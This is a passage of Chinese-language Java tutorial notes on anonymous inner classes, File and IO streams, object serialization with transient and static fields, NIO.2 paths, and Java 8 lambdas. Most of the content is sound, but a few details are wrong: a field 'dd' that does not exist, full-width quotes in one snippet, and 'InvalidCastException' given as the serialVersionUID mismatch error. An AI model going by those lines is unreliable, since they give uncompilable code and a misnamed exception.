接口式的匿名内部类。\n```Java\ninterface  Vehicle {\n    public void drive();\n}\n    \nclass Test{\n    public static void main(String[] args) {\n        Vehicle v = new Vehicle(){\n            public void drive(){\n                System.out.println(\"Driving a car!\");\n            }\n        };\n        v.drive();\n    }\n}\n```\n上面的代码很怪，好像是在实例化一个接口。事实并非如此，接口式的匿名内部类是实现了一个接口的匿名类。而且只能实现一个接口。\n\n### 参数式的匿名内部类。\n```java\nclass Bar{\n    void doStuff(Foo f){}\n}\ninterface Foo{\n    void foo();\n}\nclass Test{\n    static void go(){\n        Bar b = new Bar();\n        b.doStuff(new Foo(){\n            public void foo(){\n                System.out.println(\"foofy\");\n            }\n        });\n    }\n}\n```\n\n# IO流\n## File类\n- java.io.File类：文件和文件目录路径的抽象表示形式，与平台无关\n- File 能新建、删除、重命名文件和目录，<font color=\"red\">但File不能访问文件内容本身。</font>\n- 如果需要访问文件内容本身，则需要使用输入/输出流。 \n- 想要在Java程序中表示一个真实存在的文件或目录，那么必须有一个File对象，但是Java程序中的一个File对象，可能没有一个真实存在的文件或目录。 \n- File对象可以作为参数传递给流的构造器\n\n**常用构造器**\n- public File(String pathname) 以pathname为路径创建File对象，可以是绝对路径或者相对路径，如果pathname是相对路径，则默认的当前路径在系统属性user.dir中存储。\n  - 绝对路径：是一个固定的路径,从盘符开始\n  - 相对路径：是相对于某个位置开始\n- public File(String parent,String child) 以parent为父路径，child为子路径创建File对象。\n- public File(File parent,String child) 根据一个父File对象和子文件路径创建File对象\n\n**路径分隔符**\n- 路径中的每级目录之间用一个路径分隔符隔开。\n- 路径分隔符和系统有关：\n  - windows和DOS系统默认使用“\\”来表示\n  - UNIX和URL使用“/”来表示\n- Java程序支持跨平台运行，因此路径分隔符要慎用。\n- 为了解决这个隐患，File类提供了一个常量：\n`public static final String separator`。根据操作系统，动态的提供分隔符。\n\n举例\n```java\nFile file1 = new File(\"d:\\\\atguigu\\\\info.txt\");\nFile file2 = new File(\"d:\"+File.separator+\"atguigi\"+File.separator+\"info.txt\");\nFile file3 = new File(\"d:/atguigu\");\n```\n\n**File类常用方法**\nFile类的获取功能\n- public String getAbsolutePath()：获取绝对路径\n- public String getPath() ：获取路径\n- public String getName() ：获取名称\n- public String getParent()：获取上层文件目录路径。若无，返回null\n- public long length() ：获取文件长度（即：字节数）。不能获取目录的长度。 \n- public long lastModified() ：获取最后一次的修改时间，毫秒值\n- public String[] list() ：获取指定目录下的所有文件或者文件目录的名称数组\n- public File[] listFiles() ：获取指定目录下的所有文件或者文件目录的File数组\n\nFile类的重命名功能\n- public boolean renameTo(File dest):把文件重命名为指定的文件路径\n\nFile类的判断功能\n- public boolean isDirectory()：判断是否是文件目录\n- public boolean isFile() ：判断是否是文件\n- public boolean exists() ：判断是否存在\n- public boolean canRead() ：判断是否可读\n- public boolean canWrite() ：判断是否可写\n- public boolean isHidden() ：判断是否隐藏\n\nFile类的创建功能\n- public boolean createNewFile() ：创建文件。若文件存在，则不创建，返回false\n- public boolean mkdir() ：创建文件目录。如果此文件目录存在，就不创建了。如果此文件目录的上层目录不存在，也不创建。 \n- public boolean mkdirs() ：创建文件目录。如果上层文件目录不存在，一并创建\n注意事项：如果你创建文件或者文件目录没有写盘符路径，那么，默认在项目路径下。 \n\nFile类的删除功能\n- public boolean delete()：删除文件或者文件夹\n删除注意事项：Java中的删除不走回收站。 要删除一个文件目录，请注意该文件目录内不能包含文件或者文件目录\n\n## IO流\n**流的分类**\n- 按操作数据单位不同分为：字节流(8 bit)，字符流(16 bit)\n- 按数据流的流向不同分为：输入流（设备->程序），输出流（程序->设备）。 我们可以把创建的流对象比作成设备，例如输入流InputStream，就是将InputStream实例（比作设备）中的数据输送到程序中。输出流OutputStream，就是将程序中的数据输送到OutputStream实例（比作设备）中\n- 按流的角色的不同分为：节点流，处理流\n  - 节点流(文件流)：可以从或向一个特定的地方（节点）读写数据。如FileReader、随机存取文件流\n  - 处理流：是对一个已存在的流的连接和封装，通过所封装的流的功能调用实现数据读写。如BufferedReader。处理流的构造方法总是要带一个其他的流对象做参数。处理流包括缓冲流、转换流、标准输入流、标准输出流、打印流、数据流、对象流等\n\n| 抽象基类 | 字节流       | 字符流 |\n| -------- | ------------ | ------ |\n| 输入流   | InputStream  | Reader |\n| 输出流   | OutputStream | Writer |\n\nJava的IO流共涉及40多个类，实际上非常规则，都是从如下4个抽象基类派生的。\n由这四个类派生出来的子类名称都是以其父类名作为子类名后缀。\n\n**IO流的体系**\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220329130630.png)\n\n**InputStream**\n- `int read()` 从输入流中读取数据的下一个字节。返回 0 到 255 范围内的 int 字节值。如果因为已经到达流末尾而没有可用的字节，则返回值 -1。 \n- `int read(byte[] b)` 从此输入流中将最多 b.length 个字节的数据读入一个 byte 数组中。如果因为已经到达流末尾而没有可用的字节，则返回值 -1。否则以整数形式返回实际读取的字节数。 \n- `int read(byte[] b, int off,int len)` 将输入流中最多len个数据字节读入byte数组。尝试读取len个字节，但读取的字节也可能小于该值。以整数形式返回实际读取的字节数。如果因为流位于文件末尾而没有可用的字节，则返回值 -1。 \n- `public void close() throws IOException`  关闭此输入流并释放与该流关联的所有系统资源\n\n**Reader**\n- `int read()` 读取单个字符。作为整数读取的字符，范围在 0 到 65535 之间 (0x00-0xffff)（2个字节的Unicode码），如果已到达流的末尾，则返回 -1 \n- `int read(char[] cbuf)` 将字符读入数组。如果已到达流的末尾，则返回 -1。否则返回本次读取的字符数。 \n- `int read(char[] cbuf,int off,int len)`将字符读入数组的某一部分。存到数组cbuf中，从off处开始存储，最多读len个字符。如果已到达流的末尾，则返回 -1。否则返回本次读取的字符数。 \n- `public void close() throws IOException` 关闭此输入流并释放与该流关联的所有系统资源\n\n**OutputStream**\n- `void write(int b)` 将指定的字节写入此输出流。write 的常规协定是：向输出流写入一个字节。要写入的字节是参数 b 的八个低位。b 的 24 个高位将被忽略。 即写入0~255范围的。 \n- `void write(byte[] b)` 将 b.length 个字节从指定的 byte 数组写入此输出流。write(b) 的常规协定是：应该与调用`write(b, 0, b.length)`的效果完全相同。 \n- `void write(byte[] b,int off,int len)` 将指定 byte 数组中从偏移量 off 开始的 len 个字节写入此输出流。 \n- `public void flush()throws IOException` 刷新此输出流并强制写出所有缓冲的输出字节，调用此方法指示应将这些字节立即写入它们预期的目标。 \n- `public void close() throws IOException` 关闭此输出流并释放与该流关联的所有系统资源。\n\n**Writer**\n- `void write(int c)` 写入单个字符。要写入的字符包含在给定整数值的 16 个低位中，16 高位被忽略。 即写入0 到 65535 之间的Unicode码。\n- `void write(char[] cbuf)`写入字符数组。 \n- `void write(char[] cbuf,int off,int len)`写入字符数组的某一部分。从off开始，写入len个字符\n- `void write(String str)`写入字符串。 \n- `void write(String str,int off,int len)`写入字符串的某一部分。 \n- `void flush()` 刷新该流的缓冲，则立即将它们写入预期目标。 \n- `public void close() throws IOException` 关闭此输出流并释放与该流关联的所有系统资源。\n\n### 节点流(文件流)\n**读取文件**\n```java\nFileReader fr = null;\ntry {\n  fr = new FileReader(new File(\"c:\\\\test.txt\"));\n  char[] buf = new char[1024];\n  int len;\n  while ((len = fr.read(buf)) != -1) {\n    System.out.print(new String(buf, 0, len));\n  }\n} catch (IOException e) {\n  System.out.println(\"read-Exception :\" + e.getMessage());\n} finally {\n  if (fr != null) {\n    try {\n      fr.close();\n    } catch (IOException e) {\n      System.out.println(\"close-Exception :\" + e.getMessage());\n    } \n  } \n}\n```\n**写入文件**\n```java\nFileWriter fw = null;\ntry {\n  fw = new FileWriter(new File(\"Test.txt\"));\n  fw.write(\"atguigu-songhongkang\");\n} catch (IOException e) {\n  e.printStackTrace();\n} finally {\n  if (fw != null)\n    try {\n      fw.close();\n    } catch (IOException e) {\n      e.printStackTrace();\n  } \n}\n```\n\n### 随机存取文件流 RandomAccessFile类 (节点流)\n- RandomAccessFile 声明在java.io包下，但直接继承于java.lang.Object类。并且它实现了DataInput、DataOutput这两个接口，也就意味着这个类既可以读也可以写。\n- RandomAccessFile 类支持 “随机访问” 的方式，程序可以直接跳到文件的任意地方来读、写文件；支持只访问文件的部分内容， 可以向已存在的文件后追加内容\n- RandomAccessFile 对象包含一个记录指针，用以标示当前读写处的位置。\n- RandomAccessFile 类对象可以自由移动记录指针：\n  - long getFilePointer()：获取文件记录指针的当前位置\n  - void seek(long pos)：将文件记录指针定位到 pos 位置\n- 构造器\n  - public RandomAccessFile(File file, String mode) \n  - public RandomAccessFile(String name, String mode) \n- 创建 RandomAccessFile 类实例需要指定一个 mode 参数，该参数指定 RandomAccessFile 的访问模式：\n  - r: 以只读方式打开\n  - rw：打开以便读取和写入\n  - rwd:打开以便读取和写入；同步文件内容的更新\n  - rws:打开以便读取和写入；同步文件内容和元数据的更新\n- 如果模式为只读r。则不会创建文件，而是会去读取一个已经存在的文件，如果读取的文件不存在则会出现异常。 如果模式为rw读写。如果文件不存在则会去创建文件，如果存在则不会创建\n\n**读取文件**\n```java\nRandomAccessFile raf = new RandomAccessFile(“test.txt”, “rw”）;\nraf.seek(5);\nbyte [] b = new byte[1024];\n\nint off = 0;\nint len = 5;\nraf.read(b, off, len);\n\nString str = new String(b, 0, len);\nSystem.out.println(str);\nraf.close();\n```\n**写入文件**\n```java\nRandomAccessFile raf = new RandomAccessFile(\"test.txt\", \"rw\");\nraf.seek(5);\n\n//先读出来\nString temp = raf.readLine();\n\nraf.seek(5);\nraf.write(\"xyz\".getBytes());\nraf.write(temp.getBytes());\n\nraf.close();\n```\n\n**注意点**\n- 定义文件路径时，注意：可以用`/`或者`\\\\`。 \n- 在写入一个文件时，如果使用构造器FileOutputStream(file)，则目录下有同名文件将被覆盖。\n- 如果使用构造器FileOutputStream(file,true)，则目录下的同名文件不会被覆盖，在文件内容末尾追加内容。\n- 在读取文件时，必须保证该文件已存在，否则报异常。 \n- 字节流操作字节，比如：.mp3，.avi，.rmvb，mp4，.jpg，.doc，.ppt\n- 字符流操作字符，只能操作普通文本文件。最常见的文本文件：.txt，.java，.c，.cpp 等语言的源代码。尤其注意.doc,excel,ppt这些不是文本文件。\n\n### 缓冲流\n- <font color=\"red\">为了提高数据读写的速度</font>，Java API提供了带缓冲功能的流类，在使用这些流类时，会创建一个内部缓冲区数组，缺省使用8192个字节(8Kb)的缓冲区。\n- 缓冲流要“套接”在相应的节点流之上，根据数据操作单位可以把缓冲流分为：\n  - BufferedInputStream 和 BufferedOutputStream\n  - BufferedReader 和 BufferedWriter\n- 当读取数据时，数据按块读入缓冲区，其后的读操作则直接访问缓冲区\n- 当使用BufferedInputStream读取字节文件时，BufferedInputStream会一次性从文件中读取8192个(8Kb)，存在缓冲区中，直到缓冲区装满了，才重新从文件中读取下一个8192个字节数组。 \n- 向流中写入字节时，不会直接写到文件，先写到缓冲区中直到缓冲区写满，BufferedOutputStream才会把缓冲区中的数据一次性写到文件里。使用方法flush()可以强制将缓冲区的内容全部写入输出流\n- 关闭流的顺序和打开流的顺序相反。当关闭最外层流时，会自动关闭内层节点流，所以只要关闭最外层流即可.\n- flush()方法的使用：手动将buffer中内容写入文件\n- 如果是带缓冲区的流对象的close()方法，不但会关闭流，还会在关闭流之前刷新缓冲区，关闭后不能再写出\n```java\nBufferedReader br = null;\nBufferedWriter bw = null;\ntry {\n  // 创建缓冲流对象：它是处理流，是对节点流的包装\n  br = new BufferedReader(new FileReader(\"d:\\\\IOTest\\\\source.txt\"));\n  bw = new BufferedWriter(new FileWriter(\"d:\\\\IOTest\\\\dest.txt\"));\n  String str;\n  while ((str = br.readLine()) != null) { // 一次读取字符文本文件的一行字符\n    bw.write(str); // 一次写入一行字符串\n    bw.newLine(); // 写入行分隔符\n  }\n  bw.flush(); // 刷新缓冲区\n} catch (IOException e) {\n  e.printStackTrace();\n} finally {\n  // 关闭IO流对象\n  try {\n    if (bw != null) {\n      bw.close(); // 关闭过滤流时,会自动关闭它所包装的底层节点流\n    }\n  } catch (IOException e) {\n      e.printStackTrace();\n  }\n  try {\n    if (br != null) {\n      br.close();\n    }\n  } catch (IOException e) {\n    e.printStackTrace();\n  } \n}\n```\n\n### 转换流\n- 转换流提供了在字节流和字符流之间的转换\n- Java API提供了两个转换流：\n  - InputStreamReader: 将InputStream转换为Reader\n  - OutputStreamWriter： 将OutputStream转化为Writer\n- 字节流中的数据都是字符时，转成字符流操作更高效。 \n- 很多时候我们使用转换流来处理文件乱码问题。实现编码和解码的功能。\n\n**InputStreamReader**\n- 实现将字节的输入流按**指定字符集**转换为字符的输入流。\n- 需要和InputStream“套接”。\n- 构造器\n  - public InputStreamReader(InputStream in)\n  - public InputSreamReader(InputStream in,String charsetName)\n如： Reader isr = new InputStreamReader(System.in, \"gbk\");\n\n**OutputStreamWriter**\n- 将字节的输出流按**指定字符集**转换为字符的输出流。\n- 需要和OutputStream“套接”。\n- 构造器 \n  - public OutputStreamWriter(OutputStream out)\n  - public OutputSreamWriter(OutputStream out,String charsetName)\n\n```java\npublic void testMyInput() throws Exception {\n  FileInputStream fis = new FileInputStream(\"dbcp.txt\");\n  FileOutputStream fos = new FileOutputStream(\"dbcp5.txt\");\n\n  InputStreamReader isr = new InputStreamReader(fis, \"GBK\");\n  OutputStreamWriter osw = new OutputStreamWriter(fos, \"GBK\");\n\n  BufferedReader br = new BufferedReader(isr);\n  BufferedWriter bw = new BufferedWriter(osw);\n\n  String str = null;\n  while ((str = br.readLine()) != null) {\n    bw.write(str);\n    bw.newLine();\n    bw.flush();\n  }\n  bw.close();\n  br.close();\n}\n```\n\n### 标准输入、输出流\n- `System.in`和`System.out`分别代表了系统标准的输入和输出设备\n- 默认输入设备是：键盘, 输出设备是：显示器\n- System.in的类型是InputStream\n- System.out的类型是PrintStream，其是OutputStream的子类，FilterOutputStream 的子类\n- 重定向：通过System类的setIn，setOut方法对默认设备进行改变。\n  - public static void setIn(InputStream in)\n  - public static void setOut(PrintStream out)\n```java\nSystem.out.println(\"请输入信息(退出输入e或exit):\");\n// 把\"标准\"输入流(键盘输入)这个字节流包装成字符流,再包装成缓冲流\nBufferedReader br = new BufferedReader(new InputStreamReader(System.in));\nString s = null;\ntry {\n  while ((s = br.readLine()) != null) { // 读取用户输入的一行数据 --> 阻塞程序\n    if (\"e\".equalsIgnoreCase(s) || \"exit\".equalsIgnoreCase(s)) {\n      System.out.println(\"安全退出!!\");\n      break; \n    }\n    // 将读取到的整行字符串转成大写输出\n    System.out.println(\"-->:\" + s.toUpperCase());\n    System.out.println(\"继续输入信息\");\n  }\n} catch (IOException e) {\n  e.printStackTrace();\n} finally {\n  try {\n    if (br != null) {\n      br.close(); // 关闭过滤流时,会自动关闭它包装的底层节点流\n    }\n  } catch (IOException e) {\n    e.printStackTrace();\n  } \n}\n```\n\n### 打印流\n- 实现将基本数据类型的数据格式转化为字符串输出\n- 打印流：PrintStream和PrintWriter\n- 提供了一系列重载的print()和println()方法，用于多种数据类型的输出\n- PrintStream和PrintWriter的输出不会抛出IOException异常\n- PrintStream和PrintWriter有自动flush功能\n- PrintStream 打印的所有字符都使用平台的默认字符编码转换为字节。在需要写入字符而不是写入字节的情况下，应该使用 PrintWriter 类。 \n- System.out返回的是PrintStream的实例\n```java\nPrintStream ps = null;\ntry {\n  FileOutputStream fos = new FileOutputStream(new File(\"D:\\\\IO\\\\text.txt\"));\n  // 创建打印输出流,设置为自动刷新模式(写入换行符或字节 '\\n' 时都会刷新输出缓冲区)\n  ps = new PrintStream(fos, true);\n  if (ps != null) {// 把标准输出流(控制台输出)改成文件\n    System.setOut(ps);\n  }\n  for (int i = 0; i <= 255; i++) { // 输出ASCII字符\n    System.out.print((char) i);\n    if (i % 50 == 0) { // 每50个数据一行\n      System.out.println(); // 换行\n    } \n  }\n} catch (FileNotFoundException e) {\n  e.printStackTrace();\n} finally {\n  if (ps != null) {\n    ps.close();\n  }\n}\n```\n\n### 数据流\n- 为了方便地操作Java语言的基本数据类型和String的数据，可以使用数据流。\n- 数据流有两个类：(用于读取和写出基本数据类型、String类的数据）\n  - DataInputStream 和 DataOutputStream\n  - 分别“套接”在 InputStream 和 OutputStream 子类的流上 \n```java\nDataOutputStream dos = null;\ntry { // 创建连接到指定文件的数据输出流对象\n  dos = new DataOutputStream(new FileOutputStream(\"destData.dat\"));\n  dos.writeUTF(\"我爱北京天安门\"); // 写UTF字符串\n  dos.writeBoolean(false); // 写入布尔值\n  dos.writeLong(1234567890L); // 写入长整数\n  System.out.println(\"写文件成功!\");\n} catch (IOException e) {\n  e.printStackTrace();\n} finally { // 关闭流对象\n  try {\n    if (dos != null) {\n      // 关闭过滤流时,会自动关闭它包装的底层节点流\n      dos.close();\n    }\n  } catch (IOException e) {\n    e.printStackTrace();\n  } \n}\n```\n```java\nDataInputStream dis = null;\ntry {\n  dis = new DataInputStream(new FileInputStream(\"destData.dat\"));\n  String info = dis.readUTF();\n  boolean flag = dis.readBoolean();\n  long time = dis.readLong();\n  System.out.println(info);\n  System.out.println(flag);\n  System.out.println(time);\n} catch (Exception e) {\n  e.printStackTrace();\n} finally {\n  if (dis != null) {\n    try {\n      dis.close();\n    } catch (IOException e) {\n      e.printStackTrace();\n    } \n  } \n}\n```\n\n### 对象流\n- ObjectInputStream和OjbectOutputSteam\n用于存储和读取基本数据类型数据或对象的处理流。它的强大之处就是可以把Java中的对象写入到数据源中，也能把对象从数据源中还原回来。\n- 序列化：用ObjectOutputStream类保存基本类型数据或对象的机制\n- 反序列化：用ObjectInputStream类读取基本类型数据或对象的机制\n- ObjectOutputStream和ObjectInputStream不能序列化static和transient修饰的成员变量\n\n**对象的序列化**\n- 对象序列化机制允许把内存中的Java对象转换成平台无关的二进制流，从而允许把这种二进制流持久地保存在磁盘上，或通过网络将这种二进制流传输到另一个网络节点。//当其它程序获取了这种二进制流，就可以恢复成原来的Java对象\n- 序列化的好处在于可将任何实现了Serializable接口的对象转化为字节数据，\n使其在保存和传输时可被还原\n- 序列化是 RMI（Remote Method Invoke – 远程方法调用）过程的参数和返回值都必须实现的机制，而 RMI 是 JavaEE 的基础。因此序列化机制是JavaEE 平台的基础\n- 如果需要让某个对象支持序列化机制，则必须让对象所属的类及其属性是可序列化的，为了让某个类是可序列化的，该类必须实现Serializable接口或Externalizable接口。否则，会抛出NotSerializableException异常\n- 凡是实现Serializable接口的类都有一个表示序列化版本标识符的静态变量：`private static final long serialVersionUID`, serialVersionUID用来表明类的不同版本间的兼容性。简言之，其目的是以序列化对象进行版本控制，有关各版本反序列化时是否兼容。如果类没有显示定义这个静态常量，它的值是Java运行时环境根据类的内部细节自动生成的。若类的实例变量做了修改，serialVersionUID 可能发生变化。故建议，显式声明。\n如下：\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220329130645.png)\n\n- 简单来说，Java的序列化机制是通过在运行时判断类的serialVersionUID来验证版本一致性的。在进行反序列化时，JVM会把传来的字节流中的serialVersionUID与本地相应实体类的serialVersionUID进行比较，如果相同就认为是一致的，可以进行反序列化，否则就会出现序列化版本不一致的异常。(InvalidCastException)\n\n**使用对象流序列化对象**\n- 若某个类实现了 Serializable 接口，该类的对象就是可序列化的：\n  - 创建一个 ObjectOutputStream\n  - 调用 ObjectOutputStream 对象的 writeObject(对象) 方法输出可序列化对象\n  - 注意写出一次，操作flush()一次\n- 反序列化\n  - 创建一个 ObjectInputStream\n  - 调用 readObject() 方法读取流中的对象\n强调：如果某个类的属性不是基本数据类型或 String 类型，而是另一个引用类型，那么这个引用类型必须是可序列化的，否则拥有该类型的Field 的类也不能序列化\n\n```java\n//序列化：将对象写入到磁盘或者进行网络传输。\n//要求对象必须实现序列化\nObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\"data.txt\"));\nPerson p = new Person(\"韩梅梅\", 18, \"中华大街\", new Pet());\noos.writeObject(p);\noos.flush();\noos.close();\n\n//反序列化：将磁盘中的对象数据源读出。\nObjectInputStream ois = new ObjectInputStream(new FileInputStream(\"data.txt\"));\nPerson p1 = (Person)ois.readObject();\nSystem.out.println(p1.toString());\nois.close();\n```\n\n## 序列化与反序列化\n通过transient关键字来引进说明序列化与反序列化\n**transient作用一：**\n当是通过继承Serializable接口实现序列化,Serializable自动化完成序列时\n- transient关键字只能修饰变量，而不能修饰方法和类。注意，本地变量是不能被transient关键字修饰的。\n- 被transient关键字修饰的变量不再能被序列化。\n- 一旦变量被transient修饰，变量将不再是对象持久化的一部分，该变量内容在序列化后无法获得访问。也可以认为在将持久化的对象反序列化后，被transient修饰的变量将按照普通类成员变量一样被初始化。\n```java\npublic class TransientTest implements Serializable {\n\tprivate transient int aa = 1;  \n\tprivate int bb = 4;\n\tpublic static void main(String[] args) throws Exception {\n\t\tTransientTest transientTest = new TransientTest();\n\t\ttransientTest.aa = 11;\n\t\ttransientTest.bb = 22;\n\t\tObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(new File(\"D:\\\\serilb.txt\")));\n\t\toos.writeObject(transientTest);\n \n\t\tObjectInputStream ois = new ObjectInputStream(new FileInputStream(new File(\"D:\\\\serilb.txt\")));\n\t\tTransientTest inverseSeriObject = (TransientTest) ois.readObject();\n\t\tSystem.out.println(\"aa----> \" + inverseSeriObject.aa);  //被transient修饰的变量反序列化后，变量值被系统赋予默认初始值0（对象赋值为null)\n\t\tSystem.out.println(\"bb----> \" + inverseSeriObject.bb);  //被无修饰的变量反序列化后，变量值被保留\n\t}\n}\n```\n输出结果：\n```\naa----> 0\nbb----> 22\n```\n\n**transient作用二：**\n当是通过该继承Externalizable接口实现序列化,Externalizable自动化完成序列时\n我们知道在Java中，对象的序列化可以通过实现两种接口来实现，若操作的是一个Serializable对象，则所有的序列化将会自动进行，若操作的是 一个Externalizable对象，则没有任何东西可以自动序列化，需要在writeExternal方法中进行手工指定所要序列化的变量，这与是否被transient修饰无关。因此第二个例子输出的是变量在声明时初始化的内容，而不是系统默认初始值0（或者对象赋值为null）\n\n```java\npublic class TransientTest2 implements Externalizable{\n\tprivate transient int aa = 1;  \n\tprivate int bb = 4;\n\tpublic static void main(String[] args) throws Exception {\n\t\t// TODO Auto-generated method stub\n\t\tTransientTest2 transientTest = new TransientTest2();\n\t\ttransientTest.aa = 11;\n\t\ttransientTest.bb = 22;\n\t\tObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(new File(\"D:\\\\externalserilb.txt\")));\n\t\toos.writeObject(transientTest);\n \n\t\tObjectInputStream ois = new ObjectInputStream(new FileInputStream(new File(\"D:\\\\externalserilb.txt\")));\n\t\tTransientTest2 inverseSeriObject = (TransientTest2) ois.readObject();\n\t\tSystem.out.println(\"aa----> \" + inverseSeriObject.aa);  //被transient修饰的变量反序列化后，序列的是声明时赋予的初始，创建对象后的改变无效\n\t\tSystem.out.println(\"bb----> \" + inverseSeriObject.dd);  //被无修饰的变量反序列化后，序列的是声明时赋予的初始，创建对象后的改变无效\n\t}\n\t@Override\n\tpublic void writeExternal(ObjectOutput out) throws IOException {\n\t\tout.writeObject(aa);\n\t\tout.writeObject(bb);\n\t}\n\t@Override\n\tpublic void readExternal(ObjectInput in) throws IOException, ClassNotFoundException {\n\t\tint aa = (int)in.readObject();\n\t\tint bb = (int)in.readObject();\n\t}\n}\n```\n输出：\n```\naa----> 1\nbb----> 4\n```\n\n### 序列化与反序列化中的static\n序列化与反序列化都是针对与对象的，而不是类的，所以被静态变量或静态方法都是不能被序列化的。\n```java\nclass Person implements Serializable{\n  static int a;\n  static int b = 10;\n\n  String name; \n  public Person(String name, int age){\n    this.name = name;\n    a = 8;\n  }\n  public String toString(){\n    return \"a: \" + Person.a + \", b: \" + Person.b;\n  }\n}\n```\n```java\npublic class Te {\n  public static void main(String[] args) throws Exception{\n   ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\"data.txt\"));\n   Person p = new Person(\"whzl\", 12);\n   oos.writeObject(p);\n   oos.flush();\n   oos.close();\n    \n   ObjectInputStream ois = new ObjectInputStream(new FileInputStream(\"data.txt\"));\n   Person p1 = (Person)ois.readObject();\n   System.out.println(p1.toString());\n   ois.close(); \n  }\n}\n```\n上述代码中输出的是：`a: 8, b: 10`\n很奇怪，静态变量不是不能反序列化吗，为什么上面代码还能反序化得到a的值。这是因为变量a是类变量，是所有Person类共有的，此处a的值是从方法区中获到的。我们可以先编译运行序列化操作，再编译运行反序列化操作，此时会发现输出的结果为:`a: 0, b: 10`, 即可以证明a变量的值是从方法区中获到的，而不是反序列化获取的。\n\n## NIO.2中Path、Paths、Files类的使用\n**NIO**\n- Java NIO (New IO，Non-Blocking IO)是从Java 1.4版本开始引入的一套新 的IO API，可以替代标准的Java IO API。NIO与原来的IO有同样的作用和目的，但是使用的方式完全不同，NIO支持面向缓冲区的(IO是面向流的)、基于通道的IO操作。NIO将以更加高效的方式进行文件的读写操作。\n- Java API中提供了两套NIO，一套是针对标准输入输出NIO，另一套就是网络编程NIO。\n\n**NIO.2(也叫AIO（Asynchronous I/O）)**\n随着 JDK 7 的发布，Java对NIO进行了极大的扩展，增强了对文件处理和文件系统特性的支持，以至于我们称他们为 NIO.2。因为 NIO 提供的一些功能，NIO已经成为文件处理中越来越重要的部分。\n\n- 早期的Java只提供了一个File类来访问文件系统，但File类的功能比较有限，所提供的方法性能也不高。而且，大多数方法在出错时仅返回失败，并不会提供异常信息。\n- NIO. 2为了弥补这种不足，引入了Path接口，代表一个平台无关的平台路径，描述了目录结构中文件的位置。**Path可以看成是File类的升级版本**，实际引用的资源也可以不存在。\n- 在以前IO操作都是这样写的:\n```java\nimport java.io.File;\nFile file = new File(\"index.html\");\n```\n- 但在Java7 中，我们可以这样写：\n```java\nimport java.nio.file.Path; \nimport java.nio.file.Paths; \nPath path = Paths.get(\"index.html\");\n```\n- 同时，NIO.2在java.nio.file包下还提供了Files、Paths工具类，Files包含了大量静态的工具方法来操作文件；Paths则包含了两个返回Path的静态工厂方法。\n- Paths 类提供的静态 get() 方法用来获取 Path 对象：\n  - static Path get(String first, String … more) : 用于将多个字符串串连成路径\n  - static Path get(URI uri): 返回指定uri对应的Path路径\n  \n# JDK1.8新特性\n## 函数式接口\n**函数式接口**\n函数式接口：接口中<font color=\"red\">只有一个</font>抽象方法的接口，称为函数式接口，为了避免后来的人在这个接口中增加接口函数导致其有多个接口函数需要被实现，变成\"非函数接口”，我们可以在这个上面加上一个声明@FunctionalInterface, 这样别人就无法在里面添加新的接口函数了\n**注：在jdk1.8中，接口中可以可以有多个默认方法和静态方法。**\n\n**注:**java中还有**标识接口**：没有声明任何方法、属性的接口叫做标识接口，标识接口对实现他的类没有任何的语义要求,仅仅是冲到一个标示的作用,用来表明实现它的类属于一个特定的类型。Java中自带标识接口有Cloneable 和 Serializable等.在使用的时候可以用instanceof来判断实例对象的类型是否实现了一个特定的标识接口.\n\n\njava内置函数式接口\n| 函数式接口                                                 | 参数类型          | 返回类型          | 用途                                                                            |\n| ---------------------------------------------------------- | ----------------- | ----------------- | ------------------------------------------------------------------------------- |\n| `Consumer<T>` 消费型接口                                   | T                 | void              | 对类型为T的对象应用操作，包含方法：void accept(T t)                             |\n| `Supplier<T>` 供给型接口                                   | 无                | T                 | 返回类型为T的对象，包含方法：T get()                                            |\n| `Function<T, R>` 函数型接口                                | T                 | R                 | 对类型为T的对象应用操作，并返回结果。结果是R类型的对象。包含方法：R apply(T t)  |\n| `Predicate<T>` 断定型接口                                  | T                 | boolean           | 对类型为T的对象应用操作，并返回结果。包含方法：boolean test(T t)                |\n| `BiFunction<T, U, R>`                                      | T,U               | R                 | 对类型为T,U参数应用操作，返回R类型的结果。包含方法：R apply(T t, U u)           |\n| `UnaryOperator<T>(Function子接口)`                         | T                 | T                 | 对类型为T的对象进行一元运算，并返回T类型的结果。包含方法为：T apply(T t)        |\n| `BinaryOperator<T>(BiFunction子接口)`                      | T,T               | T                 | 对类型为T的对象进行二元运算，并返回T类型的结果。包含方法为: T apply(T t1, T t2) |\n| `BiConsumer<T, U>`                                         | T, U              | void              | 对类型为T，U参数应用操作。包含方法为：void accept(T t, U u)                     |\n| `BiPredicate<T, U>`                                        | T, U              | boolean           | 包含方法为： boolean test(T t, U u)                                             |\n| `ToIntFunction<T>, ToLongFunction<T>, ToDoubleFunction<T>` | T                 | int, long, double | 分别计算int，long，double值的函数                                               |\n| `IntFunction<R>, LongFunction<R>, DoubleFunction<R>`       | int, long, double | R                 | 参数分别为int, long, double类型的函数                                           |\n\n```java\npublic static void main(String[] args){\n  happy(400, new Consumer<Double>(){\n    public void accept(Double a){\n      System.out.println(a);\n    }\n  });\n\n  happy(500, money -> System.out.println(money + \"aa\"));\n\n  test();\n}\n\npublic static void happy(double money, Consumer<Double> con){\n  con.accept(money);\n}\n```\n\n## Lambda表达式\n<font color=\"red\">Lambda表达式本身就是一个函数接口的实例。</font>\nLambda表达式需要“函数式接口”的支持\n\n**Lambda表达式基础语法**\njava8中引入了一个新的操作符`->`, 该操作符称为箭头操作符或Lambda操作符。箭头操作符将Lambda表达式拆分为两个部分,左侧：Lambda表达式的参数列表； 右侧：Lambda表达式中所需要执行的功能，即Lambda体\n```java\n// 1. 不需要参数,返回值为 5  \n() -> 5  \n  \n// 2. 接收一个参数(数字类型),返回其2倍的值  \nx -> 2 * x  \n  \n// 3. 接受2个参数(数字),并返回他们的差值  \n(x, y) -> x – y  \n  \n// 4. 接收2个int型整数,返回他们的和  \n(int x, int y) -> x + y  \n  \n// 5. 接受一个 string 对象,并在控制台打印,不返回任何值(看起来像是返回void)  \n(String s) -> System.out.print(s)\n```\n\n我们经常使用Lambda表达式来实现匿名内部类\n\n## 方法引用\nJava 方法引用是Java 